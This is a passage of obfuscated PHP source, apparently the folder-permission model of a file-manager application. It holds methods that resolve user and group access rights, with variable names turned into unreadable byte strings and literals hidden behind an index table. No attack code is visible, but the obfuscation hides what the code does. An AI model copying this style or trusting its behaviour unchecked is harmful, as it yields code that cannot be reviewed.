$Ö‚ÂÒ‰ß); if (!$ªëğ´Ï¼ || !$Ìø©ñé) { return !1; } foreach ($Ìø©ñé as $Àà¢‹ö©) { $‰ŒŒü‘ = array(); foreach ($Àà¢‹ö©[$éÚôñ”¸[2329]] as $é÷¢ìŒÊ) { $×Â‡şÎ = $é÷¢ìŒÊ[$éÚôñ”¸[552]]; $ëéÕ›˜ = $é÷¢ìŒÊ[$éÚôñ”¸[1538]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $èŒ§¹ÅĞ = $é÷¢ìŒÊ[$éÚôñ”¸[1538]] ? $é÷¢ìŒÊ[$éÚôñ”¸[1538]] : $é÷¢ìŒÊ[$éÚôñ”¸[1440]]; if ($é÷¢ìŒÊ[$éÚôñ”¸[1538]] && $é÷¢ìŒÊ[$éÚôñ”¸[1538]] == $Ö‚ÂÒ‰ß) { continue; } $‰ŒŒü‘[] = array($éÚôñ”¸[192] => $Àà¢‹ö©[$éÚôñ”¸[192]], $éÚôñ”¸[189] => $ëéÕ›˜, $éÚôñ”¸[585] => intval($èŒ§¹ÅĞ), $éÚôñ”¸[1585] => isset($×Â‡şÎ[$éÚôñ”¸[483]]) ? intval($×Â‡şÎ[$éÚôñ”¸[483]]) : 0, $éÚôñ”¸[2293] => isset($×Â‡şÎ[$éÚôñ”¸[2293]]) ? intval($×Â‡şÎ[$éÚôñ”¸[2293]]) : -1); } $‰ŒŒü‘[] = array($éÚôñ”¸[192] => $Àà¢‹ö©[$éÚôñ”¸[192]], $éÚôñ”¸[189] => SourceModel::TYPE_USER, $éÚôñ”¸[585] => intval($Ö‚ÂÒ‰ß), $éÚôñ”¸[1585] => intval($ªëğ´Ï¼), $éÚôñ”¸[2293] => -1); $this->where(array($éÚôñ”¸[502] => $Àà¢‹ö©[$éÚôñ”¸[192]]))->delete(); $this->addAll($‰ŒŒü‘); } return !0; } public function get($ò¶˜ÉØ) { $›†éúâª = $this->getSourceList(array($ò¶˜ÉØ), !0); return $›†éúâª[0]; } public function getSourceList($…ù„ ÊÂ, $±Õ·ÑÀĞ = false, $Ìëü«ß = false) { $èßí…’ô =& $_SERVER[öæÛ¿©¿]; if (!$…ù„ ÊÂ) { return array(); } $¤ŠÉ¼Ïş = Model($èßí…’ô[1478]); if (!$±Õ·ÑÀĞ && count($…ù„ ÊÂ) == 1) { $±Õ·ÑÀĞ = array(); $±Õ·ÑÀĞ[$…ù„ ÊÂ[0]] = $¤ŠÉ¼Ïş->sourceInfo($…ù„ ÊÂ[0]); } if (!$±Õ·ÑÀĞ) { $û’¬É½ğ = array($èßí…’ô[502] => array($èßí…’ô[503], $…ù„ ÊÂ)); $±Õ·ÑÀĞ = $¤ŠÉ¼Ïş->field($èßí…’ô[2334])->where($û’¬É½ğ)->select(); $±Õ·ÑÀĞ = array_to_keyvalue($±Õ·ÑÀĞ, $èßí…’ô[192]); } $Â±ÄêÔ¹ = $…ù„ ÊÂ; foreach ($±Õ·ÑÀĞ as $ï›ä™ÀÍ => $ı‹‘Ñû¸) { $Ì¤æ§ = $¤ŠÉ¼Ïş->parentLevelArray($ı‹‘Ñû¸[$èßí…’ô[600]]); $Â±ÄêÔ¹ = array_merge($Â±ÄêÔ¹, array(intval($ï›ä™ÀÍ)), array_reverse($Ì¤æ§)); } $Â±ÄêÔ¹ = array_values(array_unique($Â±ÄêÔ¹)); if (!$Â±ÄêÔ¹) { return array(); } $Ê£¼ÉûŸ = $this->sourceAuthSelect($Â±ÄêÔ¹); $×åƒ‚ßİ = array(); foreach ($Â±ÄêÔ¹ as $¬ßšëæà) { if (isset($Ê£¼ÉûŸ[$¬ßšëæà])) { $×åƒ‚ßİ[$¬ßšëæà] = $Ê£¼ÉûŸ[$¬ßšëæà]; } } $êõ†É‡ = $this->userIsRoot($Ìëü«ß); $¯íëäßÇ = AuthModel::authAll(); $±©çª¾£ = array($èßí…’ô[499] => $¯íëäßÇ, $èßí…’ô[2335] => array($èßí…’ô[504] => 0, $èßí…’ô[2137] => $¯íëäßÇ, $èßí…’ô[505] => LNG($èßí…’ô[2316]), $èßí…’ô[2152] => $èßí…’ô[2317])); $Ô•ÂÁã÷ = array(); foreach ($±Õ·ÑÀĞ as $¬ßšëæà => $ÎÔØ×) { if ($êõ†É‡ && $GLOBALS[$èßí…’ô[6]][$èßí…’ô[2150]]) { $Ô•ÂÁã÷[$¬ßšëæà] = $±©çª¾£; continue; } $Ô•ÂÁã÷[$¬ßšëæà] = $this->makeSourceAuth($ÎÔØ×, $×åƒ‚ßİ, $Ìëü«ß); } return $Ô•ÂÁã÷; } public function authDeepCheck($ÀĞ®ğï¾, $­š®‰Âı = false) { $ÇÂøÔĞÜ =& $_SERVER[öæÛ¿©¿]; $­š®‰Âı = $­š®‰Âı ? $­š®‰Âı : USER_ID; $ğéáÂ Å = $this->makeAuthDeep($­š®‰Âı); if (!in_array($ÀĞ®ğï¾, $ğéáÂ Å[$ÇÂøÔĞÜ[2336]])) { return !1; } $êğƒùº´ = array(); foreach ($ğéáÂ Å[$ÇÂøÔĞÜ[2337]] as $ã‡Ê¤¢› => $Êş”Û¿ª) { if (!in_array($ÀĞ®ğï¾, $Êş”Û¿ª)) { continue; } $êğƒùº´[] = $ã‡Ê¤¢›; } if (!$êğƒùº´) { return !1; } $áÅŒòñı = $êğƒùº´ ? $êğƒùº´[0] : $ÀĞ®ğï¾; return array($ÇÂøÔĞÜ[499] => -1, $ÇÂøÔĞÜ[552] => array($ÇÂøÔĞÜ[504] => $ÇÂøÔĞÜ[1322], $ÇÂøÔĞÜ[2137] => $ÇÂøÔĞÜ[229], $ÇÂøÔĞÜ[505] => LNG($ÇÂøÔĞÜ[2338]), $ÇÂøÔĞÜ[2152] => $ÇÂøÔĞÜ[2339]), $ÇÂøÔĞÜ[2327] => LNG($ÇÂøÔĞÜ[2340]), $ÇÂøÔĞÜ[2341] => $this->sourceAuthInfo($áÅŒòñı)); } protected function makeAuthDeep($³”¸÷ˆ© = false) { $ô£‹ñ©¶ =& $_SERVER[öæÛ¿©¿]; static $Ğ¤ò‘üÃ = array(); $³”¸÷ˆ© = $³”¸÷ˆ© ? $³”¸÷ˆ© : USER_ID; if (isset($Ğ¤ò‘üÃ[$³”¸÷ˆ©])) { return $Ğ¤ò‘üÃ[$³”¸÷ˆ©]; } $ÈŠ£“¼ = Model($ô£‹ñ©¶[2342])->listData(); $êÁÖœˆˆ = array(); foreach ($ÈŠ£“¼ as $ˆÃ”äáá) { if ($ˆÃ”äáá[$ô£‹ñ©¶[498]] == 0 && $ˆÃ”äáá[$ô£‹ñ©¶[2151]] == $ô£‹ñ©¶[91]) { $êÁÖœˆˆ[] = $ˆÃ”äáá[$ô£‹ñ©¶[483]]; } } $å´ÀæÅ— = $this->userGroupParents($³”¸÷ˆ©); $Ó¼¸“şæ = array($ô£‹ñ©¶[189] => SourceModel::TYPE_USER, $ô£‹ñ©¶[585] => $³”¸÷ˆ©); if ($å´ÀæÅ—) { $Ó¼¸“şæ = array(array($ô£‹ñ©¶[189] => SourceModel::TYPE_USER, $ô£‹ñ©¶[585] => $³”¸÷ˆ©), array($ô£‹ñ©¶[189] => SourceModel::TYPE_GROUP, $ô£‹ñ©¶[585] => array($ô£‹ñ©¶[503], $å´ÀæÅ—)), $ô£‹ñ©¶[1112] => $ô£‹ñ©¶[2231]); } $¼˜şÍ½ì = $this->field($ô£‹ñ©¶[2343])->where($Ó¼¸“şæ)->select(); $ñê¤û = array(); $Õ„¦œ— = array_to_keyvalue_group($¼˜şÍ½ì, $ô£‹ñ©¶[192]); foreach ($Õ„¦œ— as $–À·û => $¼Ãœ˜Ùí) { $™Ø°é¸€ = $this->authArrayCheck($¼Ãœ˜Ùí, $³”¸÷ˆ©); if ($™Ø°é¸€[$ô£‹ñ©¶[499]] > 0) { $ñê¤û[] = $–À·û . $ô£‹ñ©¶[12]; } } if ($å´ÀæÅ—) { $ëú³ùâ¸ = Model($ô£‹ñ©¶[601]); foreach ($å´ÀæÅ— as $şÓ×úëù) { $¹à“®œ† = $ëú³ùâ¸->getInfo($şÓ×úëù); if (!$¹à“®œ† || !is_array($¹à“®œ†[$ô£‹ñ©¶[90]])) { continue; } $ñê¤û[] = $¹à“®œ†[$ô£‹ñ©¶[90]][$ô£‹ñ©¶[192]]; } } $ÈªÕÅ¶Ü = array(); $œ‚­æØ = $å´ÀæÅ—; $¾ŒÖ£Ê³ = Model($ô£‹ñ©¶[1478]); $ëú³ùâ¸ = Model($ô£‹ñ©¶[601]); $€®÷ë‹Ë = array(); $†Ô«Ü¿» = array(); $´ÜÂĞùÛ = array(); $´ˆ·”Ÿœ = array(); if ($ñê¤û) { $Ÿí÷Ä÷ç = $¾ŒÖ£Ê³->where(array($ô£‹ñ©¶[192] => array($ô£‹ñ©¶[503], $ñê¤û)))->select(); foreach ($Ÿí÷Ä÷ç as $€¸Ç†Ş) { if ($€¸Ç†Ş[$ô£‹ñ©¶[516]] == $ô£‹ñ©¶[91]) { continue; } $šõ¥ÑŞ = $¾ŒÖ£Ê³->parentLevelArray($€¸Ç†Ş[$ô£‹ñ©¶[600]]); $ÈªÕÅ¶Ü = array_merge($ÈªÕÅ¶Ü, $šõ¥ÑŞ); $œ‚­æØ[] = $€¸Ç†Ş[$ô£‹ñ©¶[585]]; $€®÷ë‹Ë[$€¸Ç†Ş[$ô£‹ñ©¶[192]]] = $šõ¥ÑŞ; $†Ô«Ü¿»[$€¸Ç†Ş[$ô£‹ñ©¶[192]]] = $€¸Ç†Ş[$ô£‹ñ©¶[585]]; } } $œ‚­æØ = array_values(array_unique($œ‚­æØ)); $¦ÀùêÂÍ = $œ‚­æØ; foreach ($¦ÀùêÂÍ as $şÓ×úëù) { $¹à“®œ† = $ëú³ùâ¸->getInfo($şÓ×úëù); $šõ¥ÑŞ = $¾ŒÖ£Ê³->parentLevelArray($¹à“®œ†[$ô£‹ñ©¶[600]]); $œ‚­æØ = array_merge($œ‚­æØ, $šõ¥ÑŞ); } $œ‚­æØ = array_values(array_unique($œ‚­æØ)); foreach ($œ‚­æØ as $şÓ×úëù) { $¹à“®œ† = $ëú³ùâ¸->getInfo($şÓ×úëù); $ÈªÕÅ¶Ü[] = $¹à“®œ†[$ô£‹ñ©¶[90]][$ô£‹ñ©¶[192]]; $´ÜÂĞùÛ[$şÓ×úëù] = $¹à“®œ†[$ô£‹ñ©¶[90]][$ô£‹ñ©¶[192]]; $´ˆ·”Ÿœ[$şÓ×úëù] = $¾ŒÖ£Ê³->parentLevelArray($¹à“®œ†[$ô£‹ñ©¶[600]]); } foreach ($€®÷ë‹Ë as $ËÜ›—Ù => $ñÀ¢ßË·) { $‰óöåÓ‚ = $†Ô«Ü¿»[$ËÜ›—Ù]; if (!$‰óöåÓ‚ || !$´ÜÂĞùÛ[$‰óöåÓ‚]) { continue; } $¡Õúğè’ = array(); foreach ($´ˆ·”Ÿœ[$‰óöåÓ‚] as $şÓ×úëù) { $¡Õúğè’[] = $´ÜÂĞùÛ[$şÓ×úëù]; } $€®÷ë‹Ë[$ËÜ›—Ù] = array_merge($¡Õúğè’, $ñÀ¢ßË·); } $ÈªÕÅ¶Ü = array_values(array_unique($ÈªÕÅ¶Ü)); $õ¢Æ¾µ = array($ô£‹ñ©¶[2336] => $ÈªÕÅ¶Ü, $ô£‹ñ©¶[2337] => $€®÷ë‹Ë); $Ğ¤ò‘üÃ[$³”¸÷ˆ©] = $õ¢Æ¾µ; return $õ¢Æ¾µ; } private function makeSourceAuth($¢İÌ¶Èø, $²¦å, $­´¥­Â = false) { $‹£÷õ¥œ =& $_SERVER[öæÛ¿©¿]; $ØáÃÄ£¾ = $‹£÷õ¥œ[91]; $èõ®æ° = $¢İÌ¶Èø[$‹£÷õ¥œ[585]]; $‘•°¹ˆ = $¢İÌ¶Èø[$‹£÷õ¥œ[189]] == SourceModel::TYPE_GROUP; $®¿ğáïà = $‘•°¹ˆ ? $this->groupRootAuth($èõ®æ°, $­´¥­Â) : !1; if ($®¿ğáïà && Model($‹£÷õ¥œ[587])->authCheckAction($®¿ğáïà[$‹£÷õ¥œ[498]], $‹£÷õ¥œ[1510])) { return $this->groupAuthInfo($®¿ğáïà, $èõ®æ°); } $ÌÃÈä„ö = Model($‹£÷õ¥œ[1478])->parentLevelArray($¢İÌ¶Èø[$‹£÷õ¥œ[600]]); $ÌÃÈä„ö = array_merge(array($¢İÌ¶Èø[$‹£÷õ¥œ[192]]), array_reverse($ÌÃÈä„ö)); $ı§™Ç®µ = !1; foreach ($ÌÃÈä„ö as $àçÅÆ†ã) { if (!isset($²¦å[$àçÅÆ†ã])) { continue; } $Ö“Ã¯Áñ = $this->authMake($²¦å[$àçÅÆ†ã], $­´¥­Â); if ($Ö“Ã¯Áñ[$‹£÷õ¥œ[552]]) { $ı§™Ç®µ = $Ö“Ã¯Áñ; break; } } if (!$‘•°¹ˆ) { return $ı§™Ç®µ; } if (!$ı§™Ç®µ && $®¿ğáïà) { $ı§™Ç®µ = $this->groupAuthInfo($®¿ğáïà, $èõ®æ°); } if (!$ı§™Ç®µ) { $‚ÊÀ°¹â = Model($‹£÷õ¥œ[601])->getInfo($èõ®æ°); $¸ƒ˜¼Áµ = explode($‹£÷õ¥œ[50], trim($‚ÊÀ°¹â[$‹£÷õ¥œ[600]], $‹£÷õ¥œ[50])); $¸ƒ˜¼Áµ = array_reverse($¸ƒ˜¼Áµ); foreach ($¸ƒ˜¼Áµ as $ô¸™¡Îƒ) { if ($ô¸™¡Îƒ == $‹£÷õ¥œ[229] || $ô¸™¡Îƒ == $ØáÃÄ£¾) { continue; } $ˆÆ°µ¾ = $this->groupRootAuth($ô¸™¡Îƒ, $­´¥­Â); if (!$ˆÆ°µ¾) { continue; } $ı§™Ç®µ = $this->groupAuthInfo($ˆÆ°µ¾, $ô¸™¡Îƒ); break; } } if (!$ı§™Ç®µ || $ı§™Ç®µ[$‹£÷õ¥œ[499]] <= 0) { $Í «Ã˜÷ = $this->authDeepCheck($¢İÌ¶Èø[$‹£÷õ¥œ[192]], $­´¥­Â); if ($Í «Ã˜÷) { $ı§™Ç®µ = $Í «Ã˜÷; } } return $ı§™Ç®µ; } private function userIsRoot($·åÒ†¥ = false) { $Õ—ŸïÔÊ =& $_SERVER[öæÛ¿©¿]; if (!$·åÒ†¥ && KodUser::isRoot()) { return !0; } $ÚÀŸ•±‚ = Model($Õ—ŸïÔÊ[613])->getInfo($·åÒ†¥); $‚¥ÔòïŸ = Model($Õ—ŸïÔÊ[2320])->listData($ÚÀŸ•±‚[$Õ—ŸïÔÊ[2321]]); if ($‚¥ÔòïŸ && $‚¥ÔòïŸ[$Õ—ŸïÔÊ[591]][$Õ—ŸïÔÊ[2324]] == 1) { return !0; } return !1; } private function sourceAuthInfo($°ˆÆ¥¾) { $ê˜•øØ =& $_SERVER[öæÛ¿©¿]; $±“–µã = Model($ê˜•øØ[1478]); $õ¾îÄĞ = $±“–µã->sourceInfo($°ˆÆ¥¾); if (!$õ¾îÄĞ) { return !1; } $±“–µã->groupPathDisplay($õ¾îÄĞ); $¡™ï·Çç = array($õ¾îÄĞ); $¡™ï·Çç = $±“–µã->_listAppendPath($¡™ï·Çç, !1); $õ¾îÄĞ = $¡™ï·Çç[0]; $åûÒ†·Ê = $õ¾îÄĞ[$ê˜•øØ[598]]; if (isset($õ¾îÄĞ[$ê˜•øØ[606]])) { $‹×ã¿Ü´ = explode($ê˜•øØ[8], trim($õ¾îÄĞ[$ê˜•øØ[598]], $ê˜•øØ[8])); array_shift($‹×ã¿Ü´); $åûÒ†·Ê = $õ¾îÄĞ[$ê˜•øØ[604]] . $ê˜•øØ[2344] . implode($ê˜•øØ[8], $‹×ã¿Ü´); } return array($ê˜•øØ[32] => $õ¾îÄĞ[$ê˜•øØ[32]], $ê˜•øØ[192] => $õ¾îÄĞ[$ê˜•øØ[192]], $ê˜•øØ[87] => KodIO::make($õ¾îÄĞ[$ê˜•øØ[192]]), $ê˜•øØ[598] => $åûÒ†·Ê); } private function groupAuthInfo($œÅ«ÓÌë, $Üœùï—‹) { $êÜ‚Û½à =& $_SERVER[öæÛ¿©¿]; $Š‹‹ÆÛ¨ = Model($êÜ‚Û½à[601])->getInfo($Üœùï—‹); return array($êÜ‚Û½à[2345] => intval($œÅ«ÓÌë[$êÜ‚Û½à[498]]), $êÜ‚Û½à[2335] => $œÅ«ÓÌë, $êÜ‚Û½à[2346] => LNG($êÜ‚Û½à[2347]), $êÜ‚Û½à[2341] => array($êÜ‚Û½à[505] => $Š‹‹ÆÛ¨[$êÜ‚Û½à[32]], $êÜ‚Û½à[87] => KodIO::make($Š‹‹ÆÛ¨[$êÜ‚Û½à[90]][$êÜ‚Û½à[192]]), $êÜ‚Û½à[2348] => $Š‹‹ÆÛ¨[$êÜ‚Û½à[605]])); } protected function groupRootAuth($Ñ• Ï, $åÔ™©ìÓ = false) { $üõ–­’ñ =& $_SERVER[öæÛ¿©¿]; $åÔ™©ìÓ = $åÔ™©ìÓ ? $åÔ™©ìÓ : USER_ID; $ÇõÂ°ê„ = $åÔ™©ìÓ . $üõ–­’ñ[2349] . $Ñ• Ï; static $úÁ•„ÖÂ = array(); if (isset($úÁ•„ÖÂ[$ÇõÂ°ê„])) { return $úÁ•„ÖÂ[$ÇõÂ°ê„]; } $¾è”ëÌì = Model($üõ–­’ñ[601])->getInfo($Ñ• Ï); $ô’ÂñõÀ = $this->userGroupList($åÔ™©ìÓ); $İ×Çšñ¡ = isset($ô’ÂñõÀ[$Ñ• Ï]) ? $ô’ÂñõÀ[$Ñ• Ï][$üõ–­’ñ[498]] : !1; if ($İ×Çšñ¡ && Model($üõ–­’ñ[587])->authCheckAction($İ×Çšñ¡[$üõ–­’ñ[498]], $üõ–­’ñ[1510])) { $úÁ•„ÖÂ[$ÇõÂ°ê„] = $İ×Çšñ¡; return $İ×Çšñ¡; } $£˜€ıŒ = $this->sourceAuthSelect($¾è”ëÌì[$üõ–­’ñ[90]][$üõ–­’ñ[192]]); $ö¤œ©Æ½ = $£˜€ıŒ ? $this->authMake($£˜€ıŒ, $åÔ™©ìÓ) : !1; $ŞşüËğò = $ö¤œ©Æ½ ? $ö¤œ©Æ½[$üõ–­’ñ[552]] : !1; $úÁ•„ÖÂ[$ÇõÂ°ê„] = $ŞşüËğò ? $ŞşüËğò : $İ×Çšñ¡; return $úÁ•„ÖÂ[$ÇõÂ°ê„]; } public function authOwnerApply($Ş“ô‡Ó¦) { $¨÷¿³Â¬ =& $_SERVER[öæÛ¿©¿]; if (empty($Ş“ô‡Ó¦[$¨÷¿³Â¬[498]]) || isset($Ş“ô‡Ó¦[$¨÷¿³Â¬[1529]]) && $Ş“ô‡Ó¦[$¨÷¿³Â¬[1529]]) { return $Ş“ô‡Ó¦; } if (AuthModel::authCheckRoot($Ş“ô‡Ó¦[$¨÷¿³Â¬[498]][$¨÷¿³Â¬[499]])) { return $Ş“ô‡Ó¦; } $µö’Ö¼ã = Model($¨÷¿³Â¬[1478])->parentLevelArray($Ş“ô‡Ó¦[$¨÷¿³Â¬[600]]); $µö’Ö¼ã = array_merge(array($Ş“ô‡Ó¦[$¨÷¿³Â¬[192]]), array_reverse($µö’Ö¼ã)); $Ñ¹ëçğÇ = $this->sourceAuthSelect($µö’Ö¼ã); $Ôƒ—Ğ‘Ï = array(); $„ãĞıÅ« = array(); foreach ($Ñ¹ëçğÇ as $¯‹¬¸¥ => $—İÎıÕ») { $‚“×ıµ¢ = $this->authFolderOwnerUser($—İÎıÕ»); $Ôƒ—Ğ‘Ï[$¯‹¬¸¥] = $‚“×ıµ¢; $„ãĞıÅ« = array_merge($„ãĞıÅ«, $‚“×ıµ¢[$¨÷¿³Â¬[681]]); if ($‚“×ıµ¢[$¨÷¿³Â¬[2350]]) { break; } } if (count($„ãĞıÅ«) == 0) { $„ãĞıÅ« = $this->authFolderOwnerGroup($Ş“ô‡Ó¦[$¨÷¿³Â¬[585]]); } $„ãĞıÅ« = array_unique($„ãĞıÅ«); if (AuthModel::authCheckRoot($Ş“ô‡Ó¦[$¨÷¿³Â¬[498]][$¨÷¿³Â¬[499]])) { $„ãĞıÅ«[] = USER_ID; } $Ş“ô‡Ó¦[$¨÷¿³Â¬[498]][$¨÷¿³Â¬[2351]] = Model($¨÷¿³Â¬[593])->userListInfo($„ãĞıÅ«); return $Ş“ô‡Ó¦; } private function authFolderOwnerGroup($²”†üÁ±) { $ò—œÈ•ú =& $_SERVER[öæÛ¿©¿]; $ù¬’¢¼° = Model($ò—œÈ•ú[2223])->where(array($ò—œÈ•ú[1440] => $²”†üÁ±))->select(); $İ¢õ‚±™ = array(); if (!$ù¬’¢¼°) { return $İ¢õ‚±™; } foreach ($ù¬’¢¼° as $˜ÏàĞ©ê) { $ÁÁáÖæñ = $this->authInfo($˜ÏàĞ©ê); if (AuthModel::authCheckRoot($ÁÁáÖæñ[$ò—œÈ•ú[498]])) { $İ¢õ‚±™[] = $˜ÏàĞ©ê[$ò—œÈ•ú[1538]]; } } return $İ¢õ‚±™; } private function authFolderOwnerUser($Ê±«ˆô©) { $”æÜ›´Ò =& $_SERVER[öæÛ¿©¿]; $ˆ®”øäà = array(); $™‡¨¶ò¯ = !1; foreach ($Ê±«ˆô© as $«Ø¤·öô) { $¶Ûú™Şë = $this->authInfo($«Ø¤·öô); if ($«Ø¤·öô[$”æÜ›´Ò[585]] == $”æÜ›´Ò[229]) { $™‡¨¶ò¯ = !0; } if ($«Ø¤·öô[$”æÜ›´Ò[189]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¶Ûú™Şë[$”æÜ›´Ò[498]])) { $ˆ®”øäà[] = $«Ø¤·öô[$”æÜ›´Ò[585]]; } } } return array($”æÜ›´Ò[681] => $ˆ®”øäà, $”æÜ›´Ò[2350] => $™‡¨¶ò¯); } public function authMake($Ù”Ø£ÊÏ, $æÎ×º·Ç = false) { $„µ…’Œ =& $_SERVER[öæÛ¿©¿]; $±ÍşñŞÇ = $this->authArrayCheck($Ù”Ø£ÊÏ, $æÎ×º·Ç); if ($±ÍşñŞÇ[$„µ…’Œ[2331]]) { $±ÍşñŞÇ[$„µ…’Œ[2331]] = $this->sourceAuthInfo($±ÍşñŞÇ[$„µ…’Œ[2331]]); } return $±ÍşñŞÇ; } public function authArrayCheck($‹İ’¤ãÈ, $ÄÓß’¥© = false) { $¥êß¹şÉ =& $_SERVER[öæÛ¿©¿]; if (!$‹İ’¤ãÈ) { return array($¥êß¹şÉ[499] => 0, $¥êß¹şÉ[552] => !1, $¥êß¹şÉ[2346] => $¥êß¹şÉ[12]); } $ÄÓß’¥© = $ÄÓß’¥© ? $ÄÓß’¥© : USER_ID; $€«äïéä = 0; $°—ÖÍ»ê = 0; $ÇØŒ¼Š´ = 0; $Ş›¿ŒÀ— = 0; $ç¾ŞŒ™£ = 0; $«¡ÆÅ = 0; $ÀÒÉ€²Ò = 0; $ßÁÎˆ = 0; $…ç¿£æ = 1000; $¸ØÒñ”ª = 0; $ÔÒ°¶òÌ = 0; $Ğğ€§…Â = 0; $ÜµØ—çÁ = 0; $„å¡¢‚ = 0; foreach ($‹İ’¤ãÈ as $Ä¸Ö¥ƒ’) { $Î€õ±• = $this->authInfo($Ä¸Ö¥ƒ’); if (!$Î€õ±•) { continue; } $¥™–Şïã = $Ä¸Ö¥ƒ’[$¥êß¹şÉ[585]]; $œ¸›ŸáÖ = $Ä¸Ö¥ƒ’[$¥êß¹şÉ[192]]; $÷–·Ö¨ = intval($Î€õ±•[$¥êß¹şÉ[498]]); if ($Ä¸Ö¥ƒ’[$¥êß¹şÉ[189]] == SourceModel::TYPE_USER && $¥™–Şïã == $ÄÓß’¥©) { $€«äïéä = !0; $ÇØŒ¼Š´ = $Î€õ±•; $°—ÖÍ»ê = $÷–·Ö¨; $Ş›¿ŒÀ— = $œ¸›ŸáÖ; } else { if ($Ä¸Ö¥ƒ’[$¥êß¹şÉ[189]] == SourceModel::TYPE_GROUP && $this->groupContainUser($¥™–Şïã, $ÄÓß’¥©)) { $ç¾ŞŒ™£ = !0; $Ø­â»‰ö = $this->groupStepToUserGroup($¥™–Şïã, $ÄÓß’¥©); if ($Ø­â»‰ö < $…ç¿£æ) { $…ç¿£æ = $Ø­â»‰ö; $«¡ÆÅ = $÷–·Ö¨; $ÀÒÉ€²Ò = $Î€õ±•; $¸ØÒñ”ª = $¥™–Şïã; $ßÁÎˆ = $œ¸›ŸáÖ; } if ($Ø­â»‰ö == $…ç¿£æ && $÷–·Ö¨ >= $«¡ÆÅ) { $«¡ÆÅ = $÷–·Ö¨; $ÀÒÉ€²Ò = $Î€õ±•; $¸ØÒñ”ª = $¥™–Şïã; $ßÁÎˆ = $œ¸›ŸáÖ; } } else { if (!$¥™–Şïã || $¥™–Şïã == $¥êß¹şÉ[229]) { $ÔÒ°¶òÌ = !0; $ÜµØ—çÁ = $Î€õ±•; $Ğğ€§…Â = $÷–·Ö¨; $„å¡¢‚ = $œ¸›ŸáÖ; } } } } if ($€«äïéä) { $ê¥•ä = $°—ÖÍ»ê; $Î€õ±• = $ÇØŒ¼Š´; $‘½–ı±ğ = $Ş›¿ŒÀ—; $½®¢ø‡¯ = LNG($¥êß¹şÉ[2352]); } else { if ($ç¾ŞŒ™£) { $ê¥•ä = $«¡ÆÅ; $Î€õ±• = $ÀÒÉ€²Ò; $‘½–ı±ğ = $ßÁÎˆ; $ï¼®¬œ = Model($¥êß¹şÉ[601])->getInfo($¸ØÒñ”ª); $½®¢ø‡¯ = $¥êß¹şÉ[174] . $ï¼®¬œ[$¥êß¹şÉ[605]] . $¥êß¹şÉ[2353] . LNG($¥êß¹şÉ[2354]); } else { if ($ÔÒ°¶òÌ) { $ê¥•ä = $Ğğ€§…Â; $Î€õ±• = $ÜµØ—çÁ; $‘½–ı±ğ = $„å¡¢‚; $½®¢ø‡¯ = LNG($¥êß¹şÉ[2333]); } else { $ê¥•ä = 0; $Î€õ±• = !1; $½®¢ø‡¯ = $¥êß¹şÉ[12]; $‘½–ı±ğ = $¥êß¹şÉ[12]; } } } $™ÖÎÏŠÏ = array($¥êß¹şÉ[2345] => intval($ê¥•ä), $¥êß¹şÉ[2335] => $Î€õ±•, $¥êß¹şÉ[2346] => $½®¢ø‡¯, $¥êß¹şÉ[2341] => $‘½–ı±ğ); return $™ÖÎÏŠÏ; } private function groupContainUser($¯›ˆÇ, $¯àÓı³ì = false) { return in_array($¯›ˆÇ, $this->userGroupParents($¯àÓı³ì)); } private function groupStepToUserGroup($‰È¦Ğ ¢, $ŒªÏˆı´ = false) { $‰’ú¥Ú =& $_SERVER[öæÛ¿©¿]; $Ñú“Ì…† = $this->userGroupList($ŒªÏˆı´); $·ÅÚßÉ” = 1000; $ùÊ—¥’â = $GLOBALS[$‰’ú¥Ú[6]][$‰’ú¥Ú[92]][$‰’ú¥Ú[2236]] == 1; $ÓãÙÁ = $ùÊ—¥’â ? 3 : 2; foreach ($Ñú“Ì…† as $ÀÖ†„È) { if ($ÀÖ†„È[$‰’ú¥Ú[1440]] == $‰È¦Ğ ¢) { return 0; } $—ÉŠËæˆ = explode($‰’ú¥Ú[50], trim($ÀÖ†„È[$‰’ú¥Ú[600]], $‰’ú¥Ú[50])); if ($—ÉŠËæˆ[0] == $‰’ú¥Ú[229] && count($—ÉŠËæˆ) > $ÓãÙÁ) { $çøåîä = array_reverse(array_slice($—ÉŠËæˆ, $ÓãÙÁ)); $¼„ş°¨Í = array_search($‰È¦Ğ ¢, $çøåîä); if ($¼„ş°¨Í !== !1 && $¼„ş°¨Í + 1 <= $·ÅÚßÉ”) { $·ÅÚßÉ” = $¼„ş°¨Í + 1; } } } return $·ÅÚßÉ”; } private function userGroupList($Æ©›Ğ = false, $ßë“´Š¡ = false) { $Ğ¼‡ş =& $_SERVER[öæÛ¿©¿]; static $˜Â†ÎÀœ = array(); if (isset($˜Â†ÎÀœ[$Æ©›Ğ])) { return $˜Â†ÎÀœ[$Æ©›Ğ]; } if (!$ßë“´Š¡) { $ßë“´Š¡ = Model($Ğ¼‡ş[613])->getInfo($Æ©›Ğ); } $˜Â†ÎÀœ[$Æ©›Ğ] = array_to_keyvalue($ßë“´Š¡[$Ğ¼‡ş[1439]], $Ğ¼‡ş[1440]); return $˜Â†ÎÀœ[$Æ©›Ğ]; } public function userGroupParents($ª¢ú¸Ê) { $°Çñ–© =& $_SERVER[öæÛ¿©¿]; static $÷Ô­â“ú = array(); $ª¢ú¸Ê = $ª¢ú¸Ê ? $ª¢ú¸Ê : USER_ID; if (isset($÷Ô­â“ú[$ª¢ú¸Ê])) { return $÷Ô­â“ú[$ª¢ú¸Ê]; } $¿ªÉ„«è = $this->userGroupList($ª¢ú¸Ê); $õ½–œøÃ = array(); $†Ğ¹Éâª = $GLOBALS[$°Çñ–©[6]][$°Çñ–©[92]][$°Çñ–©[2236]] == 1; $²ÉÛş–² = $†Ğ¹Éâª ? 3 : 2; foreach ($¿ªÉ„«è as $¥ï¥›Ï„) { $Ù¿ÂãíÜ = array($¥ï¥›Ï„[$°Çñ–©[1440]]); $ó°—É¶ï = explode($°Çñ–©[50], trim($¥ï¥›Ï„[$°Çñ–©[600]], $°Çñ–©[50])); if ($ó°—É¶ï[0] == $°Çñ–©[229] && count($ó°—É¶ï) > $²ÉÛş–²) { $ÑÍØ©ûï = array_slice($ó°—É¶ï, $²ÉÛş–²); $Ù¿ÂãíÜ = array_merge($Ù¿ÂãíÜ, array_reverse($ÑÍØ©ûï)); } $õ½–œøÃ = array_merge($õ½–œøÃ, $Ù¿ÂãíÜ); } $÷Ô­â“ú[$ª¢ú¸Ê] = array_unique($õ½–œøÃ); return $÷Ô­â“ú[$ª¢ú¸Ê]; } public function 